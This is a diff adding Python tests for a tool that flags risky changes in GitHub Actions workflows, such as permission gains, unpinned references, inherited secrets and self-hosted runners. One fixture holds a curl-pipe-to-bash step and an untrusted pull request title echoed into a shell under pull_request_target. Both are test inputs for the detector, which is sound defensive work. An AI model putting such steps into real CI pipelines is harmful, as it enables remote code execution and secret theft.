@@ -110,3 +110,138 @@ def test_not_a_git_repo(tmp_path):
     result = igd.inspect_diff(str(tmp_path))
     assert result["git"]["repository"] is False
     assert result["workflow_changes"] == []
+
+
+# --------------------------------------------------------------------------- #
+# expanded capability-delta coverage (Phase 2.1), driven through _diff_workflow
+# --------------------------------------------------------------------------- #
+import inspect_workflows as iw  # noqa: E402
+
+
+def _wf(text):
+    return iw.inspect_workflow_text(text, "ci.yml")
+
+
+def test_job_level_permission_gain_detected():
+    # Top level stays read-only; a job quietly gains id-token: write.
+    before = _wf(
+        "on: push\npermissions:\n  contents: read\n"
+        "jobs:\n  build:\n    runs-on: ubuntu-latest\n"
+        "    steps:\n      - run: make\n"
+    )
+    after = _wf(
+        "on: push\npermissions:\n  contents: read\n"
+        "jobs:\n  build:\n    runs-on: ubuntu-latest\n"
+        "    permissions:\n      id-token: write\n"
+        "    steps:\n      - run: make\n"
+    )
+    delta = igd._diff_workflow(before, after)
+    assert delta["permissions_gained"]["id-token"]["after"] == "write"
+
+
+def test_new_mutable_docker_reference_detected():
+    before = _wf(
+        "on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
+        "    steps:\n      - run: make\n"
+    )
+    after = _wf(
+        "on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
+        "    steps:\n      - uses: docker://alpine:3.19\n"
+    )
+    delta = igd._diff_workflow(before, after)
+    assert "docker://alpine:3.19" in delta["new_mutable_action_references"]
+
+
+def test_digest_pinned_docker_is_not_mutable():
+    digest = "sha256:" + "b" * 64
+    before = _wf("on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
+                 "    steps:\n      - run: make\n")
+    after = _wf("on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
+                f"    steps:\n      - uses: docker://alpine@{digest}\n")
+    delta = igd._diff_workflow(before, after)
+    assert "new_mutable_action_references" not in delta
+    assert f"docker://alpine@{digest}" in delta["new_action_references"]
+
+
+def test_new_secrets_inherit_and_reusable_call():
+    before = _wf("on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
+                 "    steps:\n      - run: make\n")
+    after = _wf(
+        "on: push\njobs:\n"
+        "  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make\n"
+        "  deploy:\n"
+        "    uses: org/repo/.github/workflows/deploy.yml@main\n"
+        "    secrets: inherit\n"
+    )
+    delta = igd._diff_workflow(before, after)
+    assert "deploy" in delta["new_secrets_inherit_jobs"]
+    assert "org/repo/.github/workflows/deploy.yml@main" in \
+        delta["new_reusable_workflow_calls"]
+    assert "org/repo/.github/workflows/deploy.yml@main" in \
+        delta["new_unpinned_reusable_workflow_calls"]
+
+
+def test_new_environment_and_cache():
+    before = _wf("on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
+                 "    steps:\n      - run: make\n")
+    after = _wf(
+        "on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
+        "    environment: production\n"
+        "    steps:\n      - uses: actions/cache@v4\n"
+    )
+    delta = igd._diff_workflow(before, after)
+    assert delta["new_environments"] == ["production"]
+    assert delta["new_cache_jobs"] == ["build"]
+
+
+def test_new_fetch_execute_and_untrusted_input():
+    before = _wf("on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
+                 "    steps:\n      - run: make\n")
+    after = _wf(
+        "on: pull_request_target\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
+        "    steps:\n"
+        "      - run: curl -sSL https://x/i.sh | bash\n"
+        "      - run: echo ${{ github.event.pull_request.title }}\n"
+    )
+    delta = igd._diff_workflow(before, after)
+    assert delta["new_fetch_execute"]
+    assert "github.event.pull_request.title" in \
+        delta["new_untrusted_input_references"]
+
+
+def test_new_runner_labels_and_artifact_publisher():
+    before = _wf("on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
+                 "    steps:\n      - run: make\n")
+    after = _wf(
+        "on: push\njobs:\n  build:\n    runs-on: [self-hosted, gpu]\n"
+        "    steps:\n      - uses: actions/upload-artifact@v4\n"
+    )
+    delta = igd._diff_workflow(before, after)
+    assert "gpu" in delta["new_runner_labels"]
+    assert delta["new_self_hosted_runner"] is True
+    assert "actions/upload-artifact@v4" in delta["new_artifact_publishers"]
+
+
+def test_nested_workflow_path_is_ignored(wf_repo):
+    # A workflow outside the repo-root .github/workflows/ is not active CI and
+    # must not be diffed as a live pipeline.
+    root, _ = wf_repo
+    nested = os.path.join(root, "examples", "proj", ".github", "workflows")
+    os.makedirs(nested)
+    with open(os.path.join(nested, "ci.yml"), "w") as fh:
+        fh.write(RISKY_WF)
+    result = igd.inspect_diff(root)
+    paths = [c["path"] for c in result["workflow_changes"]]
+    assert all(p.startswith(".github/workflows/") for p in paths)
+    assert not any("examples/" in p for p in paths)
+
+
+def test_parse_partial_surfaced_and_noted(wf_repo):
+    root, path = wf_repo
+    # Tabs for indentation force the parser into partial mode.
+    with open(path, "w") as fh:
+        fh.write("on: push\njobs:\n\tbuild:\n\t\truns-on: ubuntu-latest\n")
+    result = igd.inspect_diff(root)
+    change = result["workflow_changes"][0]
+    assert change["parse_partial"] is True
+    assert any("parse_partial" in n for n in result["notes"])
